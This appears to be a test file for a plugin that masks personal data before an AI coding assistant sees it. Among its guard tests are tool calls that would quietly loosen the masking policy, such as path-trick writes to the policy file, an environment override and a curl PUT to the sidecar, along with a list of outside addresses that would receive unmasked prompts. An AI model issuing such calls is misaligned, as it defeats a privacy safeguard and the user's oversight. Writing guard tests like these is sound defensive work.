  const person = ph('PERSON', 0);
  await $.tool.call({ tool: 'Bash', command: `echo ${person}`, description: `greet ${person}` });
  await $.tool.call({ tool: 'Write', file_path: 'a.txt', content: `Hi ${person}` });
  const bodies = sidecar.restoreBodies.map((b) => JSON.parse(b));
  expect(bodies[0]).toEqual({ value: { command: `echo ${person}` }, tool: 'Bash' });
  expect(bodies[1]).toEqual({
    value: { file_path: 'a.txt', content: `Hi ${person}` },
    tool: 'Write',
  });
});

test('a tool the policy adds to restoreTools gets real values in every argument', async ($, on) => {
  const sidecar = fakeSidecar({ restoreTools: [...DEFAULT_RESTORE_TOOLS, 'mcp__files__write'] });
  stubSession(on, sidecar);
  const written: unknown[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    written.push({ path: e.path, text: e.text });
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'note for John', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'mcp__files__write', path: 'n.txt', text: `for ${ph('PERSON', 0)}` });
  expect(written).toEqual([{ path: 'n.txt', text: 'for John' }]);
});

test('a policy that drops a local tool keeps its placeholders', async ($, on) => {
  const sidecar = fakeSidecar({ restoreTools: ['Read'] });
  stubSession(on, sidecar);
  const patterns: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    patterns.push(e.pattern);
    return { result: 'no matches' };
  });
  await start($);
  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Grep', pattern: ph('EMAIL', 0) });
  expect(patterns).toEqual([ph('EMAIL', 0)]);
});

test('a call without placeholders does not ask the sidecar to restore', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.tool.call({ tool: 'Bash', command: 'ls' });
  await $.tool.call({ tool: 'WebFetch', url: 'https://example.com', prompt: 'x' });
  expect(sidecar.restoreBodies).toEqual([]);
});

test('/pii shows the policy the sidecar runs with', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);
  const answer = await $.command.run({ command: 'pii', args: '' });
  expect(answer.text).toContain(`Policy file: ${POLICY_FILE} (loaded)`);
  expect(answer.text).toContain('Tools that get real values back: Read, Edit');
  expect(answer.text).toContain('Type /pii for the menu, or /pii help for every command');
});

test('a call that may change the policy file is put to the user', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.check', () => ({ decision: 'allow' }));
  await start($);
  const asks = [
    { tool: 'Write', input: { file_path: POLICY_FILE, content: '{}' } },
    { tool: 'Edit', input: { file_path: '/srv/alt/.config/nullpii/config.json' } },
    { tool: 'Bash', input: { command: 'echo {} > ~/.config/nullpii/config.json' } },
    { tool: 'Bash', input: { command: 'export NULLPII_CONFIG=/tmp/loose.json' } },
    {
      tool: 'Bash',
      input: { command: 'curl -X PUT http://127.0.0.1:8787/v1/sidecar//policy -d @p.json' },
    },
  ];
  for (const call of asks) {
    expect((await $.tool.check(call)).decision).toBe('ask');
  }
  const allows = [
    { tool: 'Write', input: { file_path: '/work/config.json', content: '{}' } },
    { tool: 'Read', input: { file_path: POLICY_FILE } },
    { tool: 'Bash', input: { command: 'ls' } },
  ];
  for (const call of allows) {
    expect((await $.tool.check(call)).decision).toBe('allow');
  }
});

test('a policy path that shows only once real values are back is refused before the tool runs', async ($, on) => {
  const sidecar = fakeSidecar({ policyFile: '/srv/John/nullpii.json' });
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.check', () => ({ decision: 'allow' }));
  on('tool.call', ($, e) => {
    ran.push(e.file_path);
    return { result: 'ok' };
  });
  await start($);
  await $.prompt.submit({ text: 'the home of John', wait: false, origin: COMPOSER });
  const call = {
    tool: 'Write',
    file_path: `/srv/${ph('PERSON', 0)}/nullpii.json`,
    content: '{}',
  };
  // The masked path names no policy file, so the check lets it through...
  expect((await $.tool.check({ tool: 'Write', input: call })).decision).toBe('allow');
  // ...and the restored one does, so the call does not run.
  const out = await $.tool.call(call);
  expect(out.deny).toContain('would change the nullpii masking policy file');
  expect(ran).toEqual([]);
});

test('the policy guard sees through case, dot segments, repeated slashes and relative paths', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, { NULLPII_SIDECAR_TOKEN: TOKEN }, '/home/node/.config/nullpii');
  on('tool.check', () => ({ decision: 'allow' }));
  await start($);
  const asks = [
    { tool: 'Write', input: { file_path: '~/.config/NULLPII/config.json', content: '{}' } },
    { tool: 'Write', input: { file_path: '/home/node/.config/nullpii/./config.json' } },
    { tool: 'Edit', input: { file_path: '/home/node/.config/nullpii//config.json' } },
    { tool: 'Edit', input: { file_path: '/home/node/.config/other/../nullpii/Config.JSON' } },
    { tool: 'Write', input: { file_path: 'config.json', content: '{}' } },
    { tool: 'Write', input: { file_path: 'C:\\Users\\me\\.config\\nullpii\\config.json' } },
    { tool: 'Bash', input: { command: "cd ~/.config/nullpii && echo '{}' > config.json" } },
    { tool: 'Bash', input: { command: 'echo {} > ~/.config/NullPii/Config.json' } },
    { tool: 'Bash', input: { command: 'export nullpii_config=/tmp/loose.json' } },
  ];
  for (const call of asks) {
    expect((await $.tool.check(call)).decision, JSON.stringify(call)).toBe('ask');
  }
  const allows = [
    { tool: 'Write', input: { file_path: '/work/nullpii-notes/config.json' } },
    { tool: 'Write', input: { file_path: '../notes.md' } },
    { tool: 'Bash', input: { command: 'cat package.json' } },
  ];
  for (const call of allows) {
    expect((await $.tool.check(call)).decision, JSON.stringify(call)).toBe('allow');
  }
});

test('a refusal stays a refusal on the policy file', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.check', () => ({ decision: 'deny', reason: 'rule' }));
  await start($);
  const out = await $.tool.check({ tool: 'Write', input: { file_path: POLICY_FILE } });
  expect(out).toEqual({ decision: 'deny', reason: 'rule' });
});

test('every call on the session carries the secret the sidecar handed out, and only that', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', () => ({ result: { stdout: '', stderr: '' } }));
  await start($);
  await $.prompt.submit({ text: 'grep for john@acme.io', wait: false, origin: COMPOSER });
  await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('EMAIL', 0)} .` });
  // The first PUT has no secret yet; every later session call sends it.
  expect(sidecar.secretsSent[0]).toBeUndefined();
  expect(sidecar.secretsSent.slice(1).length).toBeGreaterThan(1);
  expect(sidecar.secretsSent.slice(1).every((s) => s === 'secret-0')).toBe(true);
});

test('a live session it cannot prove it owns makes the mod open a new one under a new key', async ($, on) => {
  // As after a reload of the module: the sidecar still holds the session
  // under the session id, and its secret went with the old module.
  const sidecar = fakeSidecar({ liveKeys: ['session-1'] });
  stubSession(on, sidecar);
  mock.clock(on, { now: 1_700_000_000_000 });
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(seen).toEqual([`Mail ${ph('PERSON', 0)}`]);
  expect(sidecar.sessions.get('session-1')).toBe('someone-else');
  const opened = [...sidecar.sessions.keys()].filter((k) => k !== 'session-1');
  expect(opened).toHaveLength(1);
  expect(opened[0]).toMatch(/^session-1\.[0-9a-z]+$/);
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('Status: on');
});

test('a session the sidecar dropped is opened again with a fresh secret', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  sidecar.sessions.clear();
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(sidecar.sessions.get('session-1')).toBe('secret-1');
  expect(sidecar.secretsSent.at(-1)).toBe('secret-1');
});

/** Addresses `sidecar_url` must refuse: the mod would send its token and
 * every unmasked prompt there. */
const NOT_SIDECAR_URLS = [
  'http://203.0.113.7:8787',
  'https://127.0.0.1:8787',
  'http://user@127.0.0.1:8787',
  'http://127.0.0.1:8787/v1',
  'http://127.0.0.1:8787/?to=elsewhere',
  'http://127.0.0.1:8787/#frag',
  'http://127.0.0.1.nip.io:8787',
  'http://localhost.example.com:8787',
  // `localhost` can resolve to the loopback address the gateway is not on.
  'http://localhost:8787',
  'http://LOCALHOST',
  'not a url',
];

test('sidecarOrigin keeps loopback http origins and refuses every other address', () => {
  expect(sidecarOrigin('http://127.0.0.1:8787')).toBe('http://127.0.0.1:8787');
  expect(sidecarOrigin('http://127.0.0.1:8787/')).toBe('http://127.0.0.1:8787');
  expect(sidecarOrigin('http://[::1]:8787')).toBe('http://[::1]:8787');
  expect(sidecarOrigin('http://127.1:8787')).toBe('http://127.0.0.1:8787');
  for (const url of NOT_SIDECAR_URLS) expect(sidecarOrigin(url), url).toBeUndefined();
});

for (const url of NOT_SIDECAR_URLS.slice(0, 2)) {
  test(
    `sidecar_url ${url} blocks the mod before anything is sent`,
    { options: { sidecar_url: url } },
    async ($, on) => {
      const sidecar = fakeSidecar();
      stubSession(on, sidecar);
      const ran: string[] = [];
      on('prompt.submit', ($, e) => ({ text: e.text }));
      on('tool.call', ($, e) => {
        ran.push(e.tool);
        return { result: 'ok' };
      });
      await start($);
      const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
      expect(prompt.drop).toMatch(/sidecar_url is not a local sidecar address/);
      const call = await $.tool.call({ tool: 'Bash', command: 'ls' });
      expect(typeof call.deny).toBe('string');
      expect(ran).toEqual([]);
      // Not one request, so neither the token nor any text left the mod.
      expect(sidecar.calls).toEqual([]);
      const status = await $.command.run({ command: 'pii', args: '' });
      expect(status.text).toContain('Status: blocking (sidecar_url is not a local sidecar address');
    },
  );
}

test('NULLPII_SIDECAR_URL in the environment does not move the sidecar', async ($, on) => {
  // A project's settings can set environment variables; they cannot set
  // plugin options.
  const sidecar = fakeSidecar();
  stubSession(on, sidecar, {
    NULLPII_SIDECAR_TOKEN: TOKEN,
    NULLPII_SIDECAR_URL: 'http://203.0.113.7:8787',
  });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(sidecar.hosts.length).toBeGreaterThan(0);
  expect(new Set(sidecar.hosts)).toEqual(new Set(['127.0.0.1:8787']));
});

test(
  'the sidecar_url option picks the loopback address and port',
  { options: { sidecar_url: 'http://[::1]:9000' } },
  async ($, on) => {
    const sidecar = fakeSidecar();
    stubSession(on, sidecar);
    on('prompt.submit', ($, e) => ({ text: e.text }));
    await start($);
    const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
    expect(prompt.drop).toBeUndefined();
    expect(new Set(sidecar.hosts)).toEqual(new Set(['[::1]:9000']));
  },
);

/** A sidecar answer that is not JSON and quotes a value: a parse error
 * would carry `John` into whatever shows the error's text. */
const GARBAGE = 'John Smith';

test('a failure before the tool runs reaches Claude as fixed text, never the error text', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const ran: string[] = [];
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', ($, e) => {
    ran.push(e.command);
    return { result: { stdout: '', stderr: '' } };
  });
  await start($);
  await $.prompt.submit({ text: 'grep for John', wait: false, origin: COMPOSER });
  sidecar.state.garbage = GARBAGE;
  const out = await $.tool.call({ tool: 'Bash', command: `grep -r ${ph('PERSON', 0)} .` });
  expect(ran).toEqual([]);
  expect(out.deny).toMatch(/^nullpii could not prepare this tool call/);
  expect(out.deny).not.toContain('John');
  const report = await $.command.run({ command: 'pii', args: '' });
  expect(report.text).toContain(
    'Status: blocking (the sidecar answered with something that is not JSON)',
  );
  expect(report.text).not.toContain('John');
  expect(sidecar.logs.join('\n')).not.toContain('John');
});

test('a failure after the tool ran withholds the result with fixed text', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('tool.call', () => ({ result: { stdout: 'owner: John', stderr: '' } }));
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  sidecar.state.garbage = GARBAGE;
  const out = await $.tool.call({ tool: 'Bash', command: 'cat owners.txt' });
  expect(out.deny).toMatch(/^nullpii could not mask this tool's result, so it was withheld/);
  expect(JSON.stringify(out)).not.toContain('John');
  const ui = await $.ui.mount(BAND);
  expect(
    await ui.find({ type: 'Text', text: /^blocking · the sidecar sent a bad answer/ }),
  ).toBeDefined();
  expect(await ui.find({ type: 'Text', text: /John/ })).toBeUndefined();
  await ui.unmount();
  expect(sidecar.logs.join('\n')).not.toContain('John');
});

test('a prompt the sidecar cannot mask is handed back without the error text', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  sidecar.state.garbage = GARBAGE;
  const prompt = await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(prompt.drop).toContain('(the sidecar answered with something that is not JSON)');
  expect(prompt.drop).not.toContain('John');
});

test('hooks that find the session gone at once reopen it once, under one key', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  mock.clock(on, { now: 1_700_000_000_000 });
  on('prompt.submit', ($, e) => ({ text: e.text }));
  on('tool.call', () => ({ result: { stdout: 'owner: John', stderr: '' } }));
  await start($);
  // A sidecar restart, or its idle TTL: every hook in flight gets a 404.
  sidecar.sessions.clear();
  const before = sidecar.calls.length;
  const answers = await Promise.all([
    $.tool.call({ tool: 'Bash', command: 'cat a.txt' }),
    $.tool.call({ tool: 'Bash', command: 'cat b.txt' }),
    $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER }),
  ]);
  for (const answer of answers) {
    expect(JSON.stringify(answer)).not.toContain('John');
    expect('deny' in answer || 'drop' in answer, JSON.stringify(answer)).toBe(false);
  }
  const puts = sidecar.calls.slice(before).filter((c) => c.startsWith('PUT '));
  expect(puts).toEqual(['PUT /v1/sidecar/sessions/session-1']);
  expect([...sidecar.sessions.keys()]).toEqual(['session-1']);
  expect(sidecar.statuses).not.toContain(403);
  expect(sidecar.statuses).not.toContain(409);
});

test('HMAC-SHA256 matches the reference', async () => {
  // RFC 4231, test case 2.
  expect(await hmacSha256Hex('Jefe', 'what do ya want for nothing?')).toBe(
    '5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843',
  );
  // A key longer than the block size is hashed first (reference: Python's hmac).
  expect(
    await hmacSha256Hex('k'.repeat(100), 'Test Using Larger Than Block-Size Key - Hash Key First'),
  ).toBe('2bc51c04a41032b5f44910acdb471c67a7b1de64e91089e052761fe59a9dac4b');
});

test('every request follows a fresh challenge, and the challenge carries no token', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(sidecar.calls.length).toBeGreaterThan(0);
  expect(sidecar.challenges.length).toBe(sidecar.calls.length);
  expect(new Set(sidecar.challenges).size).toBe(sidecar.challenges.length);
  // Requests alternate: a challenge without the token, then the call with it.
  expect(sidecar.tokensSent).toEqual(sidecar.calls.flatMap(() => [false, true]));
});

test('a process that cannot prove the token gets neither the token nor the prompt', async ($, on) => {
  const sidecar = fakeSidecar({ impostor: true });
  stubSession(on, sidecar);
  const seen: string[] = [];
  on('prompt.submit', ($, e) => {
    seen.push(e.text);
    return { text: e.text };
  });
  await start($);
  await $.prompt.submit({ text: 'Mail John at john@acme.io', wait: false, origin: COMPOSER });
  expect(seen).toEqual([]);
  expect(sidecar.calls).toEqual([]);
  expect(sidecar.tokensSent.every((sent) => !sent)).toBe(true);
  const status = await $.command.run({ command: 'pii', args: '' });
  expect(status.text).toContain('did not prove it holds the sidecar token');
});

test('a sidecar address held by another program is named under the prompt, and in the band with the fix', async ($, on) => {
  const sidecar = fakeSidecar({ impostor: true });
  stubSession(on, sidecar);
  const lines: (string | undefined)[] = [];
  on('ui.status', ($, e) => {
    lines.push(e.text);
    return { value: undefined };
  });
  on('ui.render', () => ({ type: 'Text', props: {}, children: [''] }));
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });
  expect(lines.at(-1)).toBe('⚠ blocking · another program holds the sidecar address');
  const ui = await $.ui.mount(BAND);
  expect(
    await ui.find({
      type: 'Text',
      text: 'blocking · another program holds the sidecar address · run /pii doctor',
    }),
  ).toBeDefined();
  await ui.unmount();
});

test('/pii changes the policy through the sidecar: a preset, a mode, a reset', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);

  const secrets = await $.command.run({ command: 'pii', args: 'preset secrets' });
  expect(secrets.text).toContain('Policy changed.');
  const presetConfig = sidecar.policyBodies[0] as { categories: Record<string, string> };
  expect(presetConfig.categories.secret).toBe('mask');
  expect(presetConfig.categories.private_person).toBe('off');

  await $.command.run({ command: 'pii', args: 'ask url email' });
  expect(sidecar.policyBodies[1]).toEqual({
    categories: { ...presetConfig.categories, private_url: 'ask', private_email: 'ask' },
  });

  await $.command.run({ command: 'pii', args: 'reset' });
  expect(sidecar.policyBodies[2]).toEqual({});
});

test('/pii off is gone: allow leaves a category readable, and a verb that is not one answers with the usage', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);
  for (const args of ['off email', 'off', 'constructor email', '__proto__ email']) {
    const answer = await $.command.run({ command: 'pii', args });
    expect(answer.text).toContain('Usage: /pii');
  }
  expect(sidecar.policyBodies).toEqual([]);
});

test('/pii answers an unknown argument with its usage and changes nothing', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);

  const answer = await $.command.run({ command: 'pii', args: 'mask pets' });

  expect(answer.text).toContain('Unknown category "pets"');
  expect(sidecar.policyBodies).toEqual([]);
});

/** The `/pii` menu's own group entries, as its dialog draws them. */
const MENU_PRESETS_ENTRY = 'Preset: agent, secrets or all…';
const MENU_CATEGORY_ENTRY = 'A category: mask, ask or allow…';
const MENU_MORE_ENTRY = 'More: pause, reset, help…';
const MENU_MORE_NEXT = 'More commands…';
/** The entry that opens the next page of the category list. */
const MENU_NEXT_CATEGORIES = 'More categories…';
const MENU_QUESTION = 'nullpii: what do you want to do?';

/** One question a dialog put, with the options it offered. */
interface Asked {
  question: string;
  options: string[];
}

/** Answer the mod's dialogs in turn with `labels`, recording each question
 * and its options: the text of the entry to pick, or free text the dialog's
 * own "Other" returns. A question the list has run out on is dismissed, as
 * a `claude -p` run leaves it. */
function answerMenu(on, labels: readonly string[], asked: Asked[]) {
  let at = 0;
  on('tool.call', { tool: 'AskUserQuestion' }, ($, e) => {
    const q = e.questions[0];
    const question = q?.question ?? '';
    asked.push({ question, options: (q?.options ?? []).map((o) => o.label) });
    const label = labels[at++];
    if (label === undefined) return { deny: 'dismissed' };
    return { result: { questions: e.questions, answers: { [question]: label } } };
  });
}

test('/pii with no arguments opens the menu, and every entry names what it does', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const asked: Asked[] = [];
  // The menu's own answers: the top page, then each group below it.
  answerMenu(
    on,
    [
      MENU_PRESETS_ENTRY,
      piiCommandDescription('preset agent'),
      MENU_MORE_ENTRY,
      MENU_MORE_NEXT,
      piiCommandDescription('help'),
      piiCommandDescription('status'),
    ],
    asked,
  );
  await start($);

  const preset = await $.command.run({ command: 'pii', args: '' });
  const help = await $.command.run({ command: 'pii', args: '' });
  const status = await $.command.run({ command: 'pii', args: '' });

  expect(asked[0]?.question).toBe(MENU_QUESTION);
  // The list of options the issue asks for: the state, then the groups.
  expect(asked[0]?.options).toEqual([
    piiCommandDescription('status'),
    MENU_PRESETS_ENTRY,
    MENU_CATEGORY_ENTRY,
    MENU_MORE_ENTRY,
  ]);
  // One place for the text: an entry carries the description of the command
  // it runs, the same line `/pii help` prints.
  expect(asked[1]?.options).toEqual([
    piiCommandDescription('preset agent'),
    piiCommandDescription('preset secrets'),
    piiCommandDescription('preset all'),
  ]);
  expect(asked[3]?.options).toEqual([
    piiCommandDescription('doctor'),
    piiCommandDescription('try <text>'),
    piiCommandDescription('pause'),
    MENU_MORE_NEXT,
  ]);
  expect(asked[4]?.options).toEqual([
    piiCommandDescription('resume'),
    piiCommandDescription('reset'),
    piiCommandDescription('help'),
  ]);
  // Every entry runs what it names: the preset changes the policy, and the
  // other two print what the typed command prints.
  expect(preset.text).toContain('Policy changed.');
  expect(help.text).toBe((await $.command.run({ command: 'pii', args: 'help' })).text);
  expect(status.text).toBe((await $.command.run({ command: 'pii', args: 'status' })).text);
});

test('a preset picked in the menu sends what the typed command sends', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const asked: Asked[] = [];
  // Typed first, the menu after: both must reach the sidecar the same way.
  answerMenu(
    on,
    [
      MENU_PRESETS_ENTRY,
      piiCommandDescription('preset secrets'),
      MENU_MORE_ENTRY,
      MENU_MORE_NEXT,
      piiCommandDescription('reset'),
    ],
    asked,
  );
  await start($);

  await $.command.run({ command: 'pii', args: 'preset secrets' });
  const typedSecrets = sidecar.policyBodies[0] as Record<string, unknown>;
  await $.command.run({ command: 'pii', args: 'reset' });
  const typedReset = sidecar.policyBodies[1] as Record<string, unknown>;

  const secrets = await $.command.run({ command: 'pii', args: '' });
  const reset = await $.command.run({ command: 'pii', args: '' });

  expect(secrets.text).toContain('Policy changed.');
  expect(reset.text).toContain('Policy changed.');
  // The secrets preset masks secrets and leaves the rest readable.
  expect(typedSecrets).toMatchObject({ categories: { secret: 'mask', private_person: 'off' } });
  expect(sidecar.policyBodies[2]).toEqual(typedSecrets);
  // Reset is the agent preset, over the policy as it stands.
  expect(typedReset).toEqual({});
  expect(sidecar.policyBodies[3]).toEqual(typedReset);
});

test('a category picked in the menu applies to the policy as the typed command does', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const asked: Asked[] = [];
  answerMenu(
    on,
    [
      MENU_CATEGORY_ENTRY,
      piiCommandDescription('allow <category…>'),
      MENU_NEXT_CATEGORIES,
      MENU_NEXT_CATEGORIES,
      'passport',
    ],
    asked,
  );
  await start($);

  await $.command.run({ command: 'pii', args: 'allow email' });
  const typed = sidecar.policyBodies[0] as Record<string, unknown>;

  const answer = await $.command.run({ command: 'pii', args: '' });

  expect(answer.text).toContain('Policy changed.');
  // Three pages went by, each offering four entries: three categories and
  // the way on to the next page.
  const pages = asked.slice(2);
  expect(pages).toHaveLength(3);
  expect(pages.map((p) => p.question)).toEqual([
    'nullpii: which categories should be left readable?',
    'nullpii: which categories should be left readable?',
    'nullpii: which categories should be left readable?',
  ]);
  expect(pages[0]?.options).toEqual([
    CATEGORY_SHORT_NAMES[0],
    CATEGORY_SHORT_NAMES[1],
    CATEGORY_SHORT_NAMES[2],
    MENU_NEXT_CATEGORIES,
  ]);
  expect(pages[2]?.options).toEqual([
    CATEGORY_SHORT_NAMES[6],
    CATEGORY_SHORT_NAMES[7],
    CATEGORY_SHORT_NAMES[8],
    MENU_NEXT_CATEGORIES,
  ]);
  expect(sidecar.policyBodies[1]).toEqual(
    applyPiiCommand(typed, { kind: 'set', mode: 'off', categories: ['private_passport'] }),
  );
});

test('a pause picked in the menu is refused unless the run is the person’s own, as when typed', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  const asked: Asked[] = [];
  // The dialog would say yes to a pause: it is never put.
  answerMenu(
    on,
    [
      MENU_MORE_ENTRY,
      piiCommandDescription('pause'),
      MENU_MORE_ENTRY,
      MENU_MORE_NEXT,
      piiCommandDescription('resume'),
    ],
    asked,
  );
  await start($);

  const pause = await $.command.run({ command: 'pii', args: '' });
  const resume = await $.command.run({ command: 'pii', args: '' });

  // The test kit's `$.command.run` carries no origin: the engine stamps one
  // only for the person's own typed command, and the menu runs as it does.
  expect(pause.text).toContain('pauses masking only when you ask for it yourself');
  expect(resume.text).toContain('pauses masking only when you ask for it yourself');
  expect(asked).toHaveLength(5);
  expect(sidecar.policyBodies).toEqual([]);
});

test('a change that masks less is put to the person through the menu too, values and all', async ($, on) => {
  const sidecar = fakeSidecar({ categories: { private_email: 'mask' } });
  stubSession(on, sidecar);
  const asked: Asked[] = [];
  answerMenu(
    on,
    [MENU_PRESETS_ENTRY, piiCommandDescription('preset all'), 'Put back the previous policy'],
    asked,
  );
  await start($);
  // Another session turns names and messages off while this one is open.
  sidecar.replacePolicy({ categories: { private_email: 'off' } });

  const answer = await $.command.run({ command: 'pii', args: '' });

  // The menu's change meets the same review a typed one does: its values
  // are spelled out, and putting the old policy back comes first.
  expect(asked).toHaveLength(3);
  expect(asked[2]?.question).toContain('email mask → off');
  expect(asked[2]?.question).toContain('This change masks less: email left readable');
  expect(asked[2]?.options[0]).toBe('Put back the previous policy');
  expect(answer.text).toContain('Policy changed.');
  expect(sidecar.policyBodies).toHaveLength(2);
  expect(sidecar.policyBodies[1]).toMatchObject({ categories: { secret: 'mask' } });
});

test('/pii help lists every command, each with the line its menu entry shows', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);

  const help = await $.command.run({ command: 'pii', args: 'help' });

  const lines = help.text.split('\n');
  expect(lines[0]).toBe('The /pii commands:');
  expect(lines.at(-1)).toBe(`Categories: ${CATEGORY_SHORT_NAMES.join(', ')}`);
  expect(lines).toHaveLength(PII_COMMANDS.length + 2);
  for (const command of PII_COMMANDS) {
    const row = lines.find((line) => line.endsWith(command.description));
    expect(row?.trimStart().startsWith(`/pii ${command.args}`.trimEnd())).toBe(true);
  }
  // One line each, and one place to keep them: no command twice.
  expect(new Set(PII_COMMANDS.map((c) => c.args)).size).toBe(PII_COMMANDS.length);
  expect(sidecar.policyBodies).toEqual([]);
});

test('where a `claude -p` run cannot answer the dialog, /pii prints the status and the help', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  // A session with no one at the prompt: the dialog is refused.
  on('tool.call', { tool: 'AskUserQuestion' }, () => ({ deny: 'no one to answer' }));
  on('prompt.submit', ($, e) => ({ text: e.text }));
  await start($);
  await $.prompt.submit({ text: 'Mail John', wait: false, origin: COMPOSER });

  const answer = await $.command.run({ command: 'pii', args: '' });

  expect(answer.text).toBe(
    `${(await $.command.run({ command: 'pii', args: 'status' })).text}\n${(await $.command.run({ command: 'pii', args: 'help' })).text}`,
  );
  expect(answer.text).toContain('Masked before Claude read them: 1');
  expect(answer.text).toContain('The /pii commands:');
  expect(sidecar.policyBodies).toEqual([]);
});

test('with nothing at all to answer its dialog, /pii prints the status and the help', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);

  const answer = await $.command.run({ command: 'pii', args: '' });

  expect(answer.text).toContain('Status: on');
  expect(answer.text).toContain('Type /pii for the menu, or /pii help for every command');
  expect(answer.text).toContain('/pii help               Help: every command and what it does');
});

test('/pii is listed with the hint of its arguments, and a one-line description', async ($, on) => {
  const sidecar = fakeSidecar();
  const { registered } = stubSession(on, sidecar);
  await start($);

  expect(registered).toHaveLength(1);
  expect(registered[0]?.name).toBe('pii');
  expect(registered[0]?.argumentHint).toBe(
    '[status|doctor|try|preset|mask|ask|allow|reset|pause|resume|help]',
  );
  const description = registered[0]?.description ?? '';
  expect(description).toContain('/pii');
  expect(description).not.toContain('\n');
  expect(description.length).toBeLessThanOrEqual(80);
});

test('/pii doctor passes every check without showing a token, path or personal value', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);

  const answer = await $.command.run(typed('pii', 'doctor'));
  const lines = answer.text.split('\n');

  expect(lines).toHaveLength(8);
  expect(lines[0]).toContain('PASS Sidecar and token proof');
  expect(lines[1]).toContain('PASS Gateway and nullpii versions: 0.5.4 (pinned)');
  expect(lines[2]).toBe(`PASS Model: revision ${MODEL_REVISION}; default files have SHA-256 pins`);
  expect(lines[3]).toBe('PASS Backend: cpu');
  expect(lines[4]).toBe('PASS Token: set (value not shown)');
  expect(lines[5]).toBe('PASS Policy file: loaded and parsed');
  expect(lines[6]).toBe('INFO Mod state: on');
  expect(lines[7]).toBe('INFO Last failure: none');
  expect(answer.text).not.toContain(TOKEN);
  expect(answer.text).not.toContain(POLICY_FILE);
});

test('/pii doctor fails unsafe version, model, backend and policy metadata with fixes', async ($, on) => {
  const sidecar = fakeSidecar();
  stubSession(on, sidecar);
  await start($);
  sidecar.state.status = {
    gatewayVersion: '0.0.0',
    nullpiiVersion: '9.9.9',
    backend: 'gpu',
    model: { revision: 'John at john@acme.io', filesPinned: false },
    policy: { file: POLICY_FILE, loaded: 'John' },
  };

  const answer = await $.command.run(typed('pii', 'doctor'));

  expect(answer.text).toContain(
    'FAIL Gateway and nullpii versions: gateway 0.0.0, nullpii 9.9.9; pinned 0.5.4. Fix:',
  );
  expect(answer.text).toContain('FAIL Model:');
  expect(answer.text).toContain('FAIL Backend:');
  expect(answer.text).toContain('FAIL Policy file:');
  expect(answer.text.match(/Fix:/g)).toHaveLength(4);
  expect(answer.text).not.toContain('John');
  expect(answer.text).not.toContain('john@acme.io');
  expect(answer.text).not.toContain(POLICY_FILE);
});

test('/pii doctor names another program holding the sidecar address, and the fix', async ($, on) => {
  const sidecar = fakeSidecar({ impostor: true });
  stubSession(on, sidecar);
  await start($);

  const answer = await $.command.run(typed('pii', 'doctor'));
  const lines = answer.text.split('\n');

  expect(lines[0]).toContain('did not prove it holds the sidecar token');
  expect(lines[0]).toContain('pick a free port in the "Sidecar URL" option');
